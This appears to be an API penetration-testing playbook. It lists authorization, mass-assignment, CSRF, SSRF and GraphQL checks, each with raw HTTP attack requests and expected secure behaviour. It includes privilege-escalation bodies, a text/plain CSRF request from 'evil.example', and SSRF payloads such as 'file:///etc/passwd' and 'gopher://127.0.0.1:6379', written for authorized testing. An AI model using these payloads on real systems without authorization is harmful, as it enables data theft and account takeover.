title: API endpoint
summary: Auth on every verb, object and function authorization, mass assignment, content-type swaps, and URL-fetching fields. Two accounts minimum.

groups.title: Authorization
groups.summary: Swap the object, the verb, and the caller. That is most of API testing.

checks.title: Object-level authorization (BOLA)
checks.why: The handler trusts the object id in the path or body more than the caller.
checks.validate: Account B reads or changes account A's object. Confirm against a fresh authoritative read.

variants.name: Swap the path id
variants.payload:
GET /api/v1/orders/1002 HTTP/1.1
Host: api.example.com
Authorization: Bearer <account-A-token>
variants.expect: 1002 belongs to account B. Repeat as PUT/PATCH/DELETE on the same id.
variants.why: Reading another tenant's object via its path id with your token is the canonical BOLA.

variants.name: Swap in the JSON body
variants.payload:
PATCH /api/v1/orders/1001 HTTP/1.1
Host: api.example.com
Authorization: Bearer <account-A-token>
Content-Type: application/json

{"id":1002,"status":"cancelled"}
variants.expect: Body id must not retarget the update. Also try user_id, account_id, tenant_id, org_id.
variants.why: The object id in the body may bind a different object than the route path, bypassing the check.

variants.name: Numeric walk
variants.payload:
GET /api/v1/orders/1000 HTTP/1.1
Host: api.example.com
Authorization: Bearer <account-A-token>
variants.expect: 1000, 1001, 1002. A 200 for another tenant is the finding. Stop after a few hits.
variants.why: Sequential ids let one token sweep the object space.

variants.name: Nested and bulk
variants.payload:
POST /api/v1/orders/export HTTP/1.1
Host: api.example.com
Authorization: Bearer <account-A-token>
Content-Type: application/json

{"ids":[1001,1002,1003]}
variants.expect: Each member needs its own decision. Also /orders/1001/items/55 and /graphql node(id:).
variants.why: Nested or batch endpoints can fetch objects the top-level endpoint authorizes individually.

checks.title: Function-level authorization (BFLA)
checks.why: Admin routes exist in the spec, the JS bundle, or an older version, and a member token can call them.
checks.validate: A privileged function executes for a caller the matrix denies.

variants.name: Member token on an admin route
variants.payload:
GET /api/v1/admin/users HTTP/1.1
Host: api.example.com
Authorization: Bearer <member-token>
variants.expect: 403/404, not a user list. Repeat /internal/, /debug/, /actuator/, /manage/.
variants.why: A low-privilege token invoking an admin function is function-level authorization failure.

variants.name: Verb swap
variants.payload:
DELETE /api/v1/users/42 HTTP/1.1
Host: api.example.com
Authorization: Bearer <member-token>
variants.expect: GET may be allowed and DELETE not. Also PUT, PATCH, OPTIONS.
variants.why: The same route may authorize GET but not DELETE; swapping the verb bypasses the check.

variants.name: Version and alias
variants.payload:
GET /api/v0/admin/users HTTP/1.1
Host: api.example.com
Authorization: Bearer <member-token>
variants.expect: Older versions, /api/users vs /api/user, trailing slashes, and case variants.
variants.why: An older API version or alias route may not inherit the current authorization.

checks.title: Mass assignment / extra properties
checks.why: The binder accepts role, price, owner, or verified flags the UI never sends.
checks.validate: An unlisted property is stored and later returned or enforced.

variants.name: Hidden privilege fields
variants.payload:
PATCH /api/v1/users/me HTTP/1.1
Host: api.example.com
Authorization: Bearer <member-token>
Content-Type: application/json

{"role":"admin","isAdmin":true,"verified":true,"price":0}
variants.expect: Read the object back. role/isAdmin/verified/price/balance/tenant_id must be unchanged.
variants.why: Sending undeclared properties maps them to model attributes the API never intended to expose.

variants.name: JSON nested wrapper
variants.payload:
PATCH /api/v1/users/me HTTP/1.1
Host: api.example.com
Authorization: Bearer <member-token>
Content-Type: application/json

{"user":{"role":"admin"},"role":"admin"}
variants.expect: Some binders take the nested object, some the top-level key. Try both.
variants.why: Nested wrappers can smuggle privilege fields past a flat allowlist.

groups.title: Protocol and schema
groups.summary: Missing auth, content-type confusion, and method override.

checks.title: Missing or alternate authentication
checks.why: The same route accepts no token, an expired token, or a token in a different place.
checks.validate: A protected resource returns data without a current credential.

variants.name: Drop the Authorization header
variants.payload:
GET /api/v1/orders HTTP/1.1
Host: api.example.com
Connection: close
variants.expect: 401, not 200 with data. Repeat on every interesting route, not only /me.
variants.why: A 200 with the token removed means the resource is not actually gated.

variants.name: Token in the query string
variants.payload:
GET /api/v1/orders?access_token=<token> HTTP/1.1
Host: api.example.com
Connection: close
variants.expect: If it works, the token is now in logs and Referer. Prefer that it does not work.
variants.why: A bearer accepted from the query string leaks into logs, caches, and Referer.

variants.name: Expired and wrong-audience JWT
variants.payload: Replay a captured token after logout, after expiry, and against a sibling API on the same issuer.
variants.expect: Must fail. See the JWT playbook checks in the methodology for alg=none and kid tricks.
variants.why: Accepted expired or wrong-audience tokens mean expiry and audience are not enforced.

checks.title: Content-Type and verb override
checks.why: A JSON-only handler that also parses form or text/plain skips CSRF and schema checks.
checks.validate: The same body is accepted under a different type or verb and changes state.

variants.name: JSON as form
variants.payload:
POST /api/v1/orders HTTP/1.1
Host: api.example.com
Authorization: Bearer <token>
Content-Type: application/x-www-form-urlencoded

id=1002&status=cancelled
variants.expect: Rejected, or parsed and authorized the same way as JSON. A silent parse is the interesting case.
variants.why: Frameworks may parse the same body differently by Content-Type, altering which parameters are bound.

variants.name: JSON as text/plain (CSRF-simple)
variants.payload:
POST /api/v1/orders HTTP/1.1
Host: api.example.com
Content-Type: text/plain
Origin: https://evil.example

{"status":"cancelled"}
variants.expect: Must not change state. This is the classic simple-request CSRF shape.
variants.why: A text/plain JSON POST skips a preflight and can be CSRF'd unless a token is required.

variants.name: X-HTTP-Method-Override
variants.payload:
POST /api/v1/orders/1001 HTTP/1.1
Host: api.example.com
Authorization: Bearer <token>
X-HTTP-Method-Override: DELETE
Content-Length: 0
variants.expect: Override must not reach a handler the real DELETE would refuse. Also try _method=DELETE.
variants.why: A header override changes the effective verb the route authorizes.

checks.title: Server-side URL parameters
checks.why: webhook, import, avatar, and preview fields make the server fetch a URL you choose.
checks.validate: A callback on a host you control, or an internal destination, is fetched. Use Collaborator / a canary, never cloud metadata on a shared environment without approval.

variants.name: Collaborator HTTPS
variants.payload:
POST /api/v1/hooks HTTP/1.1
Host: api.example.com
Authorization: Bearer <token>
Content-Type: application/json

{"url":"https://unique.oast.example/wapt"}
variants.expect: An outbound HTTP hit on your listener. Repeat for image, callback, feed, avatar, import_url, pdf, sitemap.
variants.why: A controlled HTTPS callback confirms the server makes the outbound request.

variants.name: Redirect follow
variants.payload: Point url at https://unique.oast.example/302 which 302s to http://127.0.0.1/.
variants.expect: The server must not follow to loopback. Do not hit cloud metadata unless the owner approved an isolated test.
variants.why: A redirect-following fetcher can be steered to an internal address the first request was denied.

variants.name: Scheme and userinfo
variants.payload:
file:///etc/passwd
gopher://127.0.0.1:6379/_
http://127.0.0.1#@unique.oast.example/
http://unique.oast.example@127.0.0.1/
variants.expect: Schemes outside http/https should be refused. Parser differentials on userinfo are common.
variants.why: Scheme/userinfo tricks in the URL are parsed differently by the SSRF guard and the actual client.

groups.title: GraphQL extras
groups.summary: Only when a GraphQL transport is in scope.

checks.title: Introspection and suggestions
checks.why: Production introspection or field suggestions disclose the schema the client never ships.
checks.validate: __schema or a typo suggestion returns fields the public contract does not list.

variants.name: Classic introspection
variants.payload:
POST /graphql HTTP/1.1
Host: api.example.com
Content-Type: application/json

{"query":"{__schema{types{name fields{name}}}}"}
variants.expect: Disabled in production, or limited to an allowlisted consumer. A full dump is a lead plus any hidden mutations.
variants.why: Introspection reveals the schema; disabling it is the expected production posture.

variants.name: Field suggestion
variants.payload:
POST /graphql HTTP/1.1
Host: api.example.com
Content-Type: application/json

{"query":"{user{emial}}"}
variants.expect: "Did you mean email?" confirms names even when introspection is off.
variants.why: GraphQL suggestions disclose field names even when introspection is blocked.

checks.title: GraphQL object and field authorization
checks.why: node(id:), aliases, and nested edges skip the authorization the REST path has.
checks.validate: A field or node belonging to another account is returned.

variants.name: node(id:) swap
variants.payload:
POST /graphql HTTP/1.1
Host: api.example.com
Authorization: Bearer <account-A-token>
Content-Type: application/json

{"query":"{node(id:\"T3JkZXI6MTAwMg==\"){... on Order{id total}}}"}
variants.expect: Order 1002 is B's. Decode and recode other type prefixes too.
variants.why: Reading another object by global id is object-level authorization failure.

variants.name: Hidden field selection
variants.payload:
POST /graphql HTTP/1.1
Host: api.example.com
Authorization: Bearer <member-token>
Content-Type: application/json

{"query":"{me{id email role passwordHash ssn}}"}
variants.expect: role, hashes, and internal fields must be absent or unauthorized — not merely omitted by the default client query.
variants.why: Fields with per-field authorization can leak data via a query that selects them directly.

bola-path.purpose: Reading another tenant's object via its path id with your token is the canonical BOLA.
bola-path.payload:
GET /api/v1/orders/1002 HTTP/1.1
Host: api.example.com
Authorization: Bearer <account-A-token>

csrf-simple-json.purpose: A text/plain JSON POST skips a preflight and can be CSRF'd unless a token is required.
csrf-simple-json.payload:
POST /api/v1/orders HTTP/1.1
Host: api.example.com
Content-Type: text/plain
Origin: https://evil.example

{"status":"cancelled"}
